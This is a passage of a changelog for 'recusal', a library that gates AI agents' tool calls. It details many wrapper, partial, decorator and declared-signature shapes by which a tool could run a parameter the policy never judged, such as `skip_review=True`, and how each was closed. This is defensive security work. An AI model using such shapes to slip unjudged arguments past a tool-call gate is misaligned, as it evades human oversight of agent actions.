  - *What the `__call__` of a class-based decorator holds.* The instance attributes of a
    callable object that names a `__wrapped__` were read; the closure cells of its
    class's `__call__`, and the module globals that method names, were not. A class
    written inside the decorator, whose `__call__` calls a second wrapper the decorator
    built, is now refused like the same decorator written as a function, and so is a
    class at module level whose `__call__` names the wrapper as a global (listed as not
    found until now).
  - *A bound argument a wrapper takes under another name.* The walk binds the object of
    a method, and the positional arguments of a `functools.partial`, to what the function
    names as `__wrapped__`, as if the wrapper handed them on. A method that delegates to
    a free function under `functools.wraps` of it
    (`def search(self, *args, **kwargs): return search(*args, **kwargs)`) keeps the
    object: the free function ran with its first parameter at its default, which the
    signature the tool shows no longer had. And every argument bound after a kept one
    fills the parameter before its own: under `functools.partial(tools.search, "acme")`
    the bound `"acme"` filled the first parameter of the free function and its SECOND
    ran at its default (review round eight: declared `(limit=10)`, judged
    `{'limit': 5}`, ran `region='eu'`). The walk now raises the new public
    `recusal.invocation.BoundArgumentKept`, a subclass of `ValueError`, when a bound
    argument is taken on a wrapper by a named parameter, would fill, on the function
    that wrapper reaches, a parameter of ANOTHER name, and the LAST parameter the bound
    arguments would fill there has a default and is not given by name (the tool does not
    declare it, or a wrapper on the way that passes the call on, read by the walk or held
    by a decorator, takes it by name itself and so keeps the keyword); the message names
    both parameters and what to do, and `unsupported_signature` returns it. The name
    goes with the argument down the walk, through every callable that takes it in
    `*args` and names nothing for it, so the free function is refused bare and under any
    number of layers that only pass arguments on: a `(*args, **kwargs)` wrapper, a
    class-based decorator, a caching decorator, a `functools.partial` (review round
    seven: with one such decorator on the free function the method was accepted again).
    The doubt goes with it: it goes to every argument bound after the
    doubted one, and stays with the same arguments further in until a callable settles it
    (the last parameter they fill there has no default and is not given by name, so a
    call that had kept an argument fails there). A parameter that is given by name, on
    a callable that passes the call on to nothing, is not refused for this: it is
    judged whatever a wrapper above keeps. (On a callable that passes the call on, it
    is refused: review round nine, below.) *Read as before:*
    an ordinary bound method, decorated or not, cached, a `classmethod`, a wrapper that
    takes `(*args, **kwargs)`, one that takes the argument under the same name
    (`def wrapper(self, *args, **kwargs)` over a method), a facade that hands its
    receiver on to a method, a wrapped function whose parameter has no default
    (`self`), and, on Python 3.9, a pass-through decorator over the BOUND delegating
    method, which `inspect.signature` shows there with every parameter of the free
    function. *Refused although it runs correctly, and accepted by 0.15.0:* a wrapper
    with the signature of the one that keeps the argument cannot be told from it, because
    the walk reads parameters and not bodies. So a tenant-scoped facade that passes a
    value of its own in the argument's place
    (`def search(self, *args, **kwargs): return search(self.tenant, *args, **kwargs)`
    under `functools.wraps(search)`, where `tenant` has a default) is refused, and the
    message says that a wrapper which runs correctly is refused too. So are a wrapper
    that hands the argument on to a function that calls it otherwise
    (`def wrapper(client, *args, **kwargs): return f(client, *args, **kwargs)` over
    `def f(session=None, limit=10)`, bound by a `functools.partial`), a
    `functools.partial` that binds a defaulted parameter of a method whose decorator
    calls the receiver otherwise than the method does (`instance` over `self`), and
    bound arguments under a doubt that are more than the function has parameters for,
    where its last one has a default. The remedy for each: register a plain function
    that names every parameter the tool takes and calls the facade.
    *Not found, by design:* a wrapper that takes the bound
    argument in `*args` and drops it in its body, and one that takes it under the same
    name and does not hand it on (a method that takes `self` and wraps another class's
    method without passing its own object).
  - *Fixed in this change before release:* the `partialmethod` check asked
    `isinstance(..., functools.partialmethod)` of every callable, so a process in which
    another object stands under that name refused every tool. See the entry above.
  - `recusal-pydantic-ai` had rules of its own for the first and the last of these and
    keeps its reasons for them; it now refuses the other two through the kernel.
    `recusal-crewai`, which reads a tool with a walk of its own, had all four: beside a
    kernel later than 0.15.1 it asks the kernel's walk and holds every level it returns
    to the schema. Beside 0.15.1 or older it has them still, and its page says so.
  - `recusal-crewai` also did not refuse a forwarding wrapper that names a parameter
    the function it wraps takes too (`def wrapper(*args, limit=1000, **kwargs)` around
    `def fetch(query, limit=10)`: judged `limit=5`, ran `limit=10`), which the kernel
    has refused since 0.15.0. Its own walk now refuses it, beside every kernel.
  - `UnreadCache` has a reason of its own in `recusal-pydantic-ai`, `recusal-langgraph`
    and `recusal-crewai` (it is a `HiddenWrapper`, and was reported as a decorator that
    holds a second wrapper), and reaches `recusal-openai` and `recusal-google-adk` as the
    kernel's own words.
  - The module globals a wrapper names are looked up by name, and the names are found
    once for each code object: a walk no longer passes over the namespace. In a module
    of 5,000 globals, on 3.12, a wrapper that names one global is walked in about 21
    microseconds (it was about 280, and 0.15.0 takes 16), and five such
    decorators stacked in about 53 (it was about 1,320; 0.15.0 takes 37).
    Any wrapper that names a global paid the pass, one written inside a decorator
    included (a logger, `time`, a helper).
  - Run on Python 3.9 to 3.15, 3.14 free-threaded included.
- **Kernel: what review round seven found in the change above, closed before release.**
  Nothing that 0.15.0 refused is now accepted, and the bound methods and partials of the
  standard library and of the third-party packages the review had installed are read as
  0.15.0 reads them (on Python 3.12; run again after round eight, with the same result).
  - *A bound argument kept, under layers.* See "a bound argument a wrapper takes under
    another name" above: a delegating method was accepted again as soon as the free
    function wore one decorator that passes its arguments on (judged `{'limit': 5}`, ran
    a first parameter no signature showed). Refused now under any number of such layers.
  - *A cache named again, over a method.* See "a `functools.lru_cache` wrapper that
    names one function and calls another" above: over a method, a cache that calls a
    `functools.partial`, a callable object or a second cache was read by its name
    (judged `{'query', 'limit'}`, ran a wrapper's `skip_review=True`). It is read as what
    it calls.
  - *The import.* `import gc` at the top of the module raised where a process had put
    None in `sys.modules` under that name, and 0.15.0 imports there. The two imports
    0.15.0 did not make are guarded, and made when the module is imported, never at a
    walk: a walk can be the first thing a worker thread does, and an import there would
    wait on the import lock of whichever thread holds it.
  - *A listing a hook stops, and a replaced `gc.get_referents`.* An audit hook that
    stopped the listing with a `BaseException` stopped every tool with a cache, and
    another function of `gc` under the name refused every one; 0.15.0 reads them all.
    Both now leave the cache read by its name.
  - *A listing a collection interrupts.* `list(d.items())` is not one step on Python
    3.9 to 3.11 and could raise out of the walk; it is made again. See "nothing held is
    run" above.
  - *What is kept between walks* is no longer a `weakref.WeakKeyDictionary`, whose
    Python code and callbacks ran during a walk and which a stand-in under that name
    could replace. See the cache entry above.
  - *A reason for a callable object that defines `__get__`.* `inspect.signature` shows
    no signature for an object whose class defines `__get__` (it takes it for a method
    descriptor of a built-in type), and the walk, which now follows a
    `functools.partial`'s own `__wrapped__`, refused a decorator written as
    `functools.wraps(f)(functools.partial(helper, f))` over such an object as "its
    signature cannot be inspected". The walk raises the same `ValueError` as before,
    and its message, which `unsupported_signature` returns, now says the cause and what
    to do: register a plain function that calls the object, or give the class no
    `__get__`. No exception class is added for it, so a gate that names the class of
    what the walk raised goes on naming `ValueError`.
  - Run on Python 3.9 to 3.15, 3.14 free-threaded included.
- **Kernel: what review round eight found in the change above, closed before release.**
  Nothing that 0.15.0 refused is now accepted.
  - *A kept bound argument moves the ones bound after it.* See "a bound argument a
    wrapper takes under another name" above. The walk tested the parameter the kept
    argument would fill, which has no default in
    `def search(tenant, region="eu", limit=10)`, while the parameter left without a
    value is the one the LAST bound argument would fill: declared `(limit=10)`, judged
    `{'limit': 5}`, ran `region='eu'`. Refused now for a `functools.partial` of the
    delegating method, a `functools.partialmethod` of it, one partial that binds the
    object and the argument, two partials merged, a `classmethod`, a callable object's
    `__call__`, a method of a method, and a wrapper that keeps a context under a
    partial. Found while closing it, and closed: with a wrapper between the facade and
    the function that takes the next argument under the function's own name and hands
    it on, one partial that binds both was still accepted.
  - *A false refusal on Python 3.9 only.* A pass-through decorator over the bound
    delegating method is shown by 3.9's `inspect.signature` with every parameter of the
    free function, a call judged by those names runs with them, and 0.15.0 accepts it;
    it was refused with a reason that was not true of it. A parameter the tool declares
    is no longer refused for a kept argument, unless a wrapper on the way that passes
    the call on takes that parameter by name itself (or is the callable that has it:
    round nine, below): two delegating methods under a
    wrapper that keeps `limit`, applied directly or held by a decorator, were accepted on 3.9 by the first form of this fix
    (judged `limit=5`, ran the function's own default), because the walk had bound the
    second receiver to the function's `limit` and the rule that refuses a kept name no
    longer saw it. Found by the generated shapes on 3.9, and closed: it is asked at the end of the walk, where the wrappers held are known.
  - *A refusal of code that runs correctly, kept and stated.* A facade that passes a
    field of its object in the bound argument's place has the signature of the facade
    that keeps the argument. The refusal stays, in the safe direction; the entry above,
    the message and `BoundArgumentKept` now say so, with the remedy.
  - *The weak reference type.* What stands under `weakref.ref` was used if it was any
    type C code defines: with `type`, `str` or `bool` put there before the first walk,
    the walk of every tool that wears a `functools.wraps` decorator raised `TypeError`
    from the second time on. Only the interpreter's own weak reference type is used
    now, and with another under the name nothing is kept and every tool is read as
    0.15.0 reads it.
  - *A cache laid out another way is refused outright.* Where what a cache refers to is
    not laid out as either known way, the name stood if the named function was among
    what is listed, which proves nothing about what the cache calls. No supported
    interpreter lays it out another way; one that did would now get `UnreadCache`.
  - *Two costs, stated* in the cache entry above: the first walk of a new cache on a
    free-threaded build, and the memory dead entries hold until the next sweep.
  - *Said more exactly:* what importing the module can raise, what a hidden wrapper
    reached through a proxy is (not found), and the count of packages scanned, which
    was given as 90 and was not verified to the number.
  - *Simpler.* Seven simplifications the review listed are applied
    (one reason for the refusals that say their own cause, one form for "no weak
    reference type", the rebound callable built in one place) and behave as before,
    but for the cache laid out another way.
  - Run on Python 3.9 to 3.15, 3.14 free-threaded included.
- **Kernel: a signature declared on the class of what a method binds is refused.**
  Accepted by 0.15.0 too, and found while a simplification of the change above was
  tried (it was not kept: `docs/REVIEW-LOG.md`). `inspect.signature` reads a bound
  method of a callable object as the object: the `__signature__` its class declares,
  less the receiver. The walk refused a declared signature on a callable, on a
  `functools.partial`'s function and on a callable object's `__call__`, and looked at a
  method only through the attributes it shows, which are those of what it binds and
  not those of that object's class. So a class-based decorator that declares a
  signature on its class (a `__signature__` property) and is bound as a method was read
  as the signature it declared: one that shows `(query, limit=10)` over a function with
  `skip_review=True` was judged `{'query', 'limit'}` and ran `skip_review=True`. That
  held for an object bound by its own `__get__` (`types.MethodType(self, obj)`), by
  `types.MethodType` directly, by a `classmethod`, as a method of a method, and under
  a `functools.wraps` wrapper used as a method. (A signature declared on the object's
  `__call__` was refused already, when the walk reached that method.) The walk now
  looks at what a method binds as it looks at the method itself (its own `__dict__`,
  its class, a `functools.partial`'s function, a callable object's `__call__`, a
  method of a method in turn) and raises
  `DeclaredSignature`, or `PartialMethodSignature` for the mark of a
  `functools.partialmethod` found there; `unsupported_signature` returns "it declares
  a signature that is not its own". Nothing that 0.15.0 refused is now accepted.
  - *Refused although it runs correctly, and accepted by 0.15.0:* the walk does not
    compare a declared signature with the function behind it, so a bound object that
    declares a signature is refused whatever the signature says, one that declares the
    true parameters included. Among them: a `functools.wraps` wrapper, used as a
    method, of a `toolz.curry` object (its class declares `__signature__`); and a
    method over a `functools.lru_cache`
    wrapper that is named for the method (`functools.wraps(method)` over the cache)
    and calls such an object, where the tool shows every parameter of the method and a
    call judged by them runs with them. The remedy for each: register a plain function
    that names every parameter the tool takes and calls the object.
  - *Read as before:* a plain bound method, a `classmethod`, a method under
    `functools.wraps`, a method over a cache, a class-based decorator that declares
    nothing, and a method whose RECEIVER's class declares a signature (a model class):
    the receiver is not looked at. A method of a method is not counted as one wrapper
    more, so no depth of them is refused for this.
  - *A reason that changed.* A `functools.partial` of a `functools.partialmethod` read
    from its class is refused as a `functools.partialmethod`. Under a decorator that is
    itself a bound method (`functools.wraps` on a method of a holder object) it was
    refused for a parameter that is not annotated or is variadic: what that method
    binds is looked at now, and it gets the partialmethod reason there too.
  - *Not found, by design:* a signature declared on a wrapper a callable only holds
    (see the hidden wrapper above: a held wrapper is judged by its parameters alone).
  - Run on Python 3.9 to 3.15, 3.14 free-threaded included.
- **Kernel: what review rounds nine to fifteen found in the changes above, closed
  before release.** Each of these is accepted by 0.15.0 as well. Run on Python 3.9 to 3.15,
  3.14 free-threaded included.
  - *A bound argument handed on by keyword.* See "a bound argument a wrapper takes
    under another name" above. A facade that hands its tenant on BY KEYWORD
    (`def search(self, *args, **kwargs): return capped(*args, tenant=self.tenant,
    **kwargs)`, under `functools.wraps(capped)`) over a wrapper that has a leading
    parameter of its own and keeps it (`def wrapper(limit=100, *args, **kwargs):
    return function(*args, **kwargs)`): the walk binds the facade's receiver to that
    leading `limit`, so it read the wrapper as taking nothing by that name, while in
    the call the receiver never reaches it and the judged `limit` does. Declared
    `(limit=10)`, judged `{'limit': 5}`, ran `limit=10`; through
    `recusal_openai.judge_and_run` the same. With a leading parameter that has no
    default: judged `region='us'`, ran `region='eu'`. Refused now with
    `BoundArgumentKept`: bound arguments under a doubt, where the last parameter they
    would fill is one the tool declares and the callable that has it passes the call
    on (`*args` or `**kwargs`). Refused for a method, a `classmethod`, and with
    pass-through decorators between or over them. *Read as before:* a facade that
    hands its argument on, by position or by keyword, to a function that passes the
    call on to nothing.
  - *The same, with the keeping wrapper held* (round ten). A method decorator that
    applies the keeping wrapper inside itself, hands its tenant on to it by keyword and
    names the function as `__wrapped__`
    (`held = capped(function)` ... `return held(*args, tenant=self.tenant, **kwargs)`):
    the rule above is made where the walk binds an argument, which a held wrapper is
    never reached by, and the held wrapper's leading `limit` was left out as the place
    of the receiver. Declared `(limit=10)`, judged `{'limit': 5}`, ran `limit=10`.
    Refused now with `HiddenWrapper`: a held wrapper that passes the call on, whose
    leading parameter in the place of a bound argument is one the tool declares, or
    (round eleven) one of its own that has a default: with
    `def wrapper(skip_review=True, *args, **kwargs)` held the same way, nothing fills
    `skip_review`, and the wrapper ran with a default the tool does not show.
    And (round fourteen) a held wrapper that passes the call on to NOTHING, where
    such a parameter has a default the tool does not declare: a method decorator that
    holds `def wrapper(tenant="public", limit=10): return function(tenant, limit)`
    and keeps its receiver ran `tenant='public'`. A name the framework injects is not
    excepted from this, as it is not for a wrapper the walk reads.
    *Read as before:* a held wrapper whose leading parameter is the receiver's own
    (`self`, which no tool declares and which has no default), and one that passes
    the call on to nothing and takes there a name the tool declares: it runs with the
    judged keyword.
  - *A signature only the lookup finds.* `inspect.signature` asks the callable for
    `__signature__`. The check looked in the callable's `__dict__` and on its class,
    so it did not see one a class answers for in `__getattr__` or `__getattribute__`:
    a forwarding proxy with a plain `__call__` over a function that declares one
    showed `(query, limit=10)` and ran `skip_review=True`. The check now makes the
    lookup `inspect.signature` makes. Asking runs what the class of a callable on the
    walk defines for the names asked: `__signature__`, and `__text_signature__` and
    `__code__` for the two entries below. Where that raises anything but
    `AttributeError`, the callable is refused as one that cannot be inspected.
    `inspect.signature` raises there too for `__signature__`; for `__text_signature__`
    it does from Python 3.13, and before that it does not ask an ordinary callable
    object for it, so such an object, which 0.15.0 reads, is refused on 3.9 to 3.12.
  - *A text signature.* `inspect.signature` reads `__text_signature__`, the attribute
    the interpreter uses for callables written in C, wherever Python code sets one:
    on a plain function (Python 3.9 to 3.15), and so on a method, a
    `functools.partial`, a cache, a `staticmethod` and a `functools.wraps` wrapper of
    one; on an object whose class defines `__get__`; and, from Python 3.13, on any
    callable object. The check did not look for it. The review found the object whose
    class defines `__get__`; the plain function and the rest were found while closing
    that. `f.__text_signature__ = "(query, limit=10)"` on
    `def f(query, limit=10, skip_review=True)` showed two parameters and ran
    `skip_review=True`. A text that is declared is refused now with
    `DeclaredSignature`, on every Python, also where that Python would not read it
    (which callables it reads so has changed between versions). The text of a
    callable written in C is its own and is not refused, bare or bound as a method: it
    is told by where the lookup finds the name (the accessor the interpreter defines
    on the callable's type, with nothing in the callable's own `__dict__`; a method
    is asked as what it binds).
  - *An object that looks like a function* (round ten). `inspect.signature` reads a
    callable object that shows a code object, a name and defaults (`__code__`,
    `__name__`, `__defaults__`) as a function, from those, in place of its `__call__`.
    The walk read the `__call__` as well, so no parameter could be hidden, but a
    default could: shown `limit=10`, ran `limit=999999` when the call left it out. An
    object called through a `__call__` written in Python that shows a code object and
    names nothing as `__wrapped__` is refused now with `DeclaredSignature`. *Read as
    before:* a transparent proxy, which shows the code of what it wraps and names it
    as `__wrapped__` (`inspect.signature` follows that first, and so does the walk),
    and a function a C extension builds.
  - *A signature declared on a wrapper the walk looks through.* `inspect.signature`
    stops at a `__signature__` set on a `functools.lru_cache` wrapper itself, or on a
    `staticmethod` object, and reads it in place of the function underneath. The walk
    looked through those wrappers without asking them. The function under them was
    still read, so no parameter could be hidden, but a default could: shown
    `limit=10`, ran `limit=999999` when the call left it out. Found while closing the
    two above. They are asked now, a method over a cache included.
  - *A refusal that was not true, ended.* A callable object whose METACLASS declares
    `__signature__` shows none itself, and `inspect.signature` reads its `__call__`.
    It was refused with "it declares a signature that is not its own", and the entry
    above had extended that to such an object bound as a method. It is read now, by
    the parameters of its `__call__`. The same for a class whose `__signature__` is a
    property that raises `AttributeError` for the instance: `inspect.signature` finds
    none there either. These are the two shapes 0.15.0 refused that are accepted, and
    every parameter their call takes is read and judged. (Each earlier entry's
    "nothing that 0.15.0 refused is now accepted" is said of its own change.)
  - *Refused although it runs correctly:* a callable that declares a text signature,
    answers for `__signature__` in a hook, or looks like a function, whatever the
    declaration says; and a facade that hands its argument on, by keyword or by
    position, to a wrapper, read or held, that takes the judged name in the bound
    argument's place and does hand it on, or whose leading parameter has a default
    and does receive the bound argument by position
    (`def wrapper(self=None, *args, **kwargs)` held by a method decorator, or
    `def wrapper(session=None, *args, **kwargs)` under a `functools.partial` that
    binds the session); and a `functools.partial` that binds, by position, the
    defaulted first parameter of a function whose decorator HOLDS a wrapper that
    names that parameter again (the same partial over a decorator the walk reads
    through `__wrapped__` is read). The walk reads parameters, not bodies. The remedy for
    each: register a plain function that names every parameter the tool takes.
  - *Said more exactly.* `detached` "calls no function written in Python for a value"
    with one exception it has always had, now stated: telling a value's type compares
    the type with each supported one, and a class whose metaclass defines `__eq__`
    answers that comparison. And a caller that counted on the `RecursionError` is
    named in the `detached` entry above: `recusal-pydantic-ai`.
  - *Not found, by design, and stated for the first time* (round eleven): the walk
    compares the NAMES each callable takes, not their defaults. A wrapper that
    declares the tool's parameters again with another default
    (`@functools.wraps(f) def wrapper(query, limit=999999): return f(query, limit)`
    over `def f(query, limit=10)`) shows `limit=10` and runs `limit=999999` when the
    call leaves `limit` out. A caller that fills every default from the signature the
    tool shows and passes each by name, as `recusal-openai` does, runs what it
    judged. The declarations refused above (a `__signature__` on a cache, an object
    that looks like a function) can hide a default the same way; they are refused
    because a declared signature is refused wherever it stands, not because defaults
    are compared.
  - *The same, where no wrapper names the bound argument* (round twelve). A facade
    that takes its receiver in `*args` (`self, rest = args[0], args[1:]`) and hands
    the tenant on by keyword raises no name doubt, and the rule above acted only
    under one. Over the keeping wrapper: judged `{'limit': 5}`, ran `limit=10`; over
    `def wrapper(skip_review=True, *args, **kwargs)`: ran `skip_review=True`. A
    wrapper the walk reads now gets the rule a held one gets: where it passes the
    call on, and any parameter the bound arguments would fill on it is one the tool
    declares or has a default, it is refused with `BoundArgumentKept`, doubt or no
    doubt. Any parameter, not the last (round thirteen): with two arguments bound by
    one `functools.partial` and both handed on by keyword, over
    `def wrapper(limit, context, *args, **kwargs)`, the last place is a required name
    of the wrapper's own and the first is the judged one. Judged `{'limit': 5}`, ran
    `limit=10`.
  - *The family of the bound argument, in one sentence* (the reviewer's, round
    eleven): the walk knows the place of a bound argument only at the callable that
    binds it; at each callable further in that passes the call on, read or held, it
    takes the argument to arrive by position in the leading parameter, and a wrapper
    that hands it on by keyword, or keeps it, leaves that parameter to the judged
    keyword or to its own default. What is refused now: on a callable that passes
    the call on, read or held, a leading parameter in a bound argument's place that
    the tool declares or that has a default (on a held one, but for the places a
    `functools.partial` or a method directly over it fills itself); and on a callable
    that passes the call on to nothing, such a parameter with a default the tool does
    not declare: on a held one always, and on one the walk reads where a wrapper
    above took the argument under another name.
    *Still not found, by design:* a wrapper the walk reads that takes the bound
    argument in `*args`, or under the very name the function has for it, and keeps it
    or hands it on by keyword, over a function the walk reads that passes the call on
    to nothing, where a parameter the bound arguments would fill there has a default
    the tool does not declare (the first, or a later one: a kept argument moves the
    ones bound after it). It has the signature of a `functools.partial` that binds a
    defaulted parameter of a decorated function, which is ordinary and is read.
    Refusing bound arguments wherever they would fill a defaulted parameter was tried
    and not kept for that reason (`docs/REVIEW-LOG.md`).
- **Adapters: the refusals the kernel's walk makes by name are reported as what they
  are, and the same `partialmethod` gap is closed in `recusal-crewai`.** Not released;
  each package changed still allows `recusal` 0.15.0, which has neither `HiddenWrapper` nor
  `DispatchedAtCallTime`, and handles a stand-in there that nothing raises.
  - `recusal-pydantic-ai`: beside a kernel with `DispatchedAtCallTime`, a
    single-dispatch tool was refused as "the function this tool runs, or a decorator on
    it, cannot be inspected", because the kernel's walk raised before the gate's own
    check was asked. It is refused with the gate's own reason for a single-dispatch
    function again, and a `HiddenWrapper` with a reason that says a decorator holds a
    second wrapper, names the parameter, and says what to do.
  - `recusal-langgraph` (and `recusal-langchain`, which gates through it): the two were
    reported as "cannot be inspected for its parameters (HiddenWrapper)", with a
    class-based descriptor as the example. Each now has its own reason and remedy.
  - `recusal-openai`, `recusal-google-adk`: the kernel's reason is passed on with what
    the kernel found and what to do, added only when the walk raises that very reason.
  - A `PartialMethodSignature` has a reason of its own in `recusal-pydantic-ai` and
    `recusal-langgraph` (it was "cannot be inspected", in LangGraph with a class-based
    descriptor as the example), and reaches `recusal-openai` and `recusal-google-adk` as
    the kernel's own reason, in place of "not annotated". `recusal-crewai` raises and
    reports its own, beside every kernel.
  - `recusal-crewai` reads a tool with a walk of its own, which had the `partialmethod`
    gap (judged `{'amount': 5}`, ran a wrapper's `force=True`): it refuses the same
    mark. That walk follows `__wrapped__` alone, so it also found neither a decorator
    that holds a second wrapper nor a single-dispatch function; the gate now asks a
    kernel that has the two refusals for exactly those, and refuses with the cause.
    Beside `recusal` 0.15.1 or older, neither is found.
  - `recusal-openai-agents` and `recusal-openai-agents-mcp` are not changed here.

## [0.15.1] - 2026-11-23

A PATCH release of the kernel under `STABILITY.md`: one correctness fix in the audit log,
under Fixed below. `AuditLog.append` handed the same mutable entry to every sink, to the
`entries` mirror and to its caller, so a sink or a caller that changed it changed what the
others held; each now gets a copy of its own. The file on disk was never affected. No
verdict, decision path, reason string of the frozen kernel or import path changed. Under
`recusal/`, 0.15.1 differs from 0.15.0 in `recusal.audit` and the version string.

Everything else listed here was added to the repository since 0.15.0 and is not part of
the `recusal` wheel: the adapter packages, each a separate distribution on PyPI under its
own version and tag, and documentation. Since 0.15.0 every adapter has had a release, most
of them security releases, listed under Security and Changed below: `recusal-crewai`
0.2.2, `recusal-google-adk` 0.2.1, `recusal-langchain` 0.2.0, `recusal-langgraph` 0.3.0,
`recusal-openai` 0.2.2, `recusal-openai-agents` 0.2.1, `recusal-openai-agents-mcp` 0.2.0
and `recusal-pydantic-ai` 0.2.0. If you gate one of those frameworks, upgrade that
package.

### Added

- **The `recusal-google-adk` wheel is checked on its minimum Python.** CI builds the
  wheel once and installs those same files on Python 3.12 and on the package's declared
  minimum, read from `pyproject.toml`; both environments run the smoke test, `pip check`
  and the installed-package type check, and a test holds the job to that. Thanks to
  @hananbahi527 for the work (#310, the first part of #262).
- **The review tooling for `recusal-openai` is in the repository, and its README says
  what was tested.** `tools/review/openai/` holds the three scripts the numbers come
  from: `corpus.py` runs a generated corpus of model output through the plain and the
  audited loop and compares them, `keyword_matrix.py` calls the three entry points
  with every combination of the recording keywords, and `mutate.py` switches one
  check off at a time in a temporary copy of the checkout and runs the package's
  tests against it. Each prints one line of counts and exits with status 1 on any
  finding. `docs/REVIEW.md` says what a review round is, the threat model, each
  method, how to reproduce each number and what none of it shows, and the package's
  README has a "How it was tested" section. `tests/test_review_tooling_openai.py`
  holds every number on both pages to what the scripts compute, and both OpenAI lanes
  run it. No change to the gate, and no release.
- **A review log, package by package.** `docs/REVIEW-LOG.md` records each review round of
  the kernel and the eight adapters: what it found, what changed, what is still open, and
  where help is welcome, each statement with the commit, test or changelog entry that
  backs it. The commits of the rounds of branches merged as one commit are kept on the
  `review-history/*` branches.

### Changed

- **Every page says what Recusal does not enforce.** Recusal judges the tool calls that
  reach a gate; it does not stop an agent that can reach a resource another way. The
  kernel README says so under its status line, and each adapter page, which is its PyPI
  page, says so just before its Status, with the layers to put around it and a link to
  the limits in full in SECURITY.md. A test keeps the paragraph on all nine pages. The
  adapter pages reach PyPI with each package's next release.

- **`recusal-crewai` 0.2.2: it requires a CrewAI that does not install `chromadb`, and
  every function is annotated.** No change to the gate: it is the one 0.2.1 shipped,
  and its tests pass unchanged on `crewai` 1.15.44. The floor rises to
  `crewai>=1.15.42` (see Security below). The functions that had no annotations have
  them, and CI checks the installed wheel with `--disallow-untyped-defs
  --disallow-incomplete-defs`, so the package's inline types are complete. Thanks to
  @hananbahi527 for the work (#303). The README, which is the PyPI page, carries the
  website and OpenSSF Scorecard badges and a Status section that says what review the
  adapter has had.

- **`recusal-google-adk` 0.2.1: every function is annotated, and its page shows where the
  project stands.** No change to the gate: it is the one 0.2.0 shipped. The three
  functions that had no annotations have them (the `Finding` contract, the callback's
  return type and the SDK's own `BeforeToolCallback`), and CI now checks the installed
  wheel with `--disallow-untyped-defs --disallow-incomplete-defs`, so the package's
  inline types are complete. Thanks to @hananbahi527 for the work (#301). The README,
  which is the PyPI page, carries the website and OpenSSF Scorecard badges and a Status
  section that says what review the adapter has had.

### Fixed

- **An audit sink, or the caller of `append`, could change what another sink received
  and what the log kept in memory.** `AuditLog.append` handed one entry dict to every
  sink in turn, kept that same dict in `entries`, and returned it. A sink that changed
  its argument without raising (one that uppercased `entry["action"]["tool"]` to format
  it, say), a sink that kept its argument and changed it later, or a caller that changed
  the returned entry therefore changed the entry the next sink was handed and the one in
  `entries`: that sink's record and `verify(log.entries)` then failed verification, or
  held a value nobody adjudicated, with no error raised. On a file-backed log a sink that
  rewrote `entry["hash"]` also set that process's `last_hash` until the next append read
  the head back from the file. Sinks have behaved this way since they were added in
  0.6.0, and the returned entry has been the retained one since the audit log first
  shipped in 0.1.0. Now each sink is handed a copy of its own, decoded from the line the
  file stores, with the same `seq` and `hash`, and `append` returns another copy to its
  caller, so nothing a sink or a caller does to its entry, at once or later, reaches
  another sink, `entries`, the head, or the returned entry. Each copy is the stored form
  and verifies on its own. **The file was never affected:** the line is written before
  any sink is called and was never rewritten, so an on-disk chain verified throughout
  and existing logs are unchanged. Order and failure handling are as they were: the file
  is written first, sinks are called in order inside the append lock, and a sink that
  raises fails the append. The cost is one decode of the entry per sink and one for the
  returned entry when `entries` is kept (an in-memory log also encodes the entry once).
  Code that relied on `append` returning the very object held in `entries`
  (`log.append(...) is log.entries[-1]`) now gets an equal dict that is a different
  object.

### Security

- **`recusal-openai-agents` 0.2.1: every `functools.singledispatch` function is refused
  as a tool, registered or not, and so are a `functools.partialmethod` and a
  `weakref.proxy`.** Found by review rounds five and six; round five's items were stated
  as open on the 0.2.0 package page. Reproduced on `openai-agents` 0.24.0.
  - A single-dispatch tool with nothing registered was accepted, and the guardrail
    looked at its registry again on every call. The SDK checks every call of a model
    turn before any tool body runs, so an implementation registered during a turn, by
    another tool call of it or by the tool's own first use, ran for a later call of that
    turn with a parameter no policy saw (judged `{target, overwrite}`, ran with
    `recursive=True`). A `functools.singledispatch` function and a
    `singledispatchmethod` are now refused when the agent is built, whether or not
    anything is registered, with a `TypeError` that names the cause and what to do:
    register one plain function as the tool and branch on the type inside its body (a
    single-dispatch function called from that body is not read). **This refuses tools
    0.2.0 accepted**: a single-dispatch function with nothing registered.
  - A dispatcher that is a callable object's `__call__` was not found under a
    `functools.wraps` wrapper, and its registered implementation ran with its own
    default. The question is now asked of every callable the gate's walk reaches (the
    function, a `functools.partial`'s function, a bound method's function, the function
    under a `staticmethod` or a `classmethod`, what `__wrapped__` names, a callable
    object's `__call__` and the callable a `functools.partialmethod` holds). A test
    holds that every step the 0.15.0 kernel's walk takes from one callable to the next
    (`recusal.invocation._next_callables`) is among them; the gate's walk also steps
    into a partialmethod and into the `__wrapped__` a `functools.partial` carries,
    which that kernel's walk does not, so a parameter of a wrapper under such a
    partial is still not held to the tool's schema (open, stated on the page). A walk
    that does not finish,
    and a callable the question cannot be asked of, are refused.
  - A `functools.partialmethod` hid the callable it holds (round six, and in 0.2.0).
    Read from a class, or from an object when the callable it holds has no `__get__` (a
    class-based decorator's instance; a `functools.partial` up to Python 3.13), a
    partialmethod is a function of `functools`' own, and `inspect` reads the held
    callable's parameters as that function's. Neither the gate nor the kernel's walk
    read what is under the held callable: a single-dispatch function there ran its
    registered implementation, and a wrapper there ran its own parameter, with a value
    no policy saw (judged `{sql, force}`, ran with `dry_run` at its default). A callable
    the call reaches that is or carries a partialmethod is now refused when the agent
    is built, whatever the partialmethod holds, and a single-dispatch function under it
    is named as that. **This refuses tools 0.2.0 accepted**: a partialmethod over a
    plain function read from its class, and one over a class-based decorator. A
    partialmethod over a plain method read from an object is a `functools.partial`,
    which the SDK refuses itself. Register a plain function that calls it.
  - A `weakref.proxy` of a single-dispatch function was accepted (round six): the walk
    read `__wrapped__` through the proxy and stepped past the dispatcher. A weak proxy
    anywhere among the callables the call reaches is now refused. **This refuses tools
    0.2.0 accepted**: a weak proxy of a plain function.
  - A dispatcher was recognised by one code object read when the package was imported.
    After `importlib.reload(functools)` a new dispatcher was not recognised; with
    `functools.singledispatch` replaced before the import, an earlier dispatcher could
    pass, and a replacement with no `__code__` made the import raise. A dispatcher is
    now recognised in three ways, any one of which is enough: by that code object, as
    read at import and as `functools` stands at the check; by how `functools` builds
    the function (its closure holds a `dispatch` function whose closure holds a
    `registry` dict beside a `dispatch_cache` and a `cache_token`, which every
    dispatcher has on Python 3.10 to 3.15); and by a `registry` that is exactly a
    `types.MappingProxyType` beside a callable `dispatch` and a callable `register`.
    These tests read the object's type, its closure cells and, with
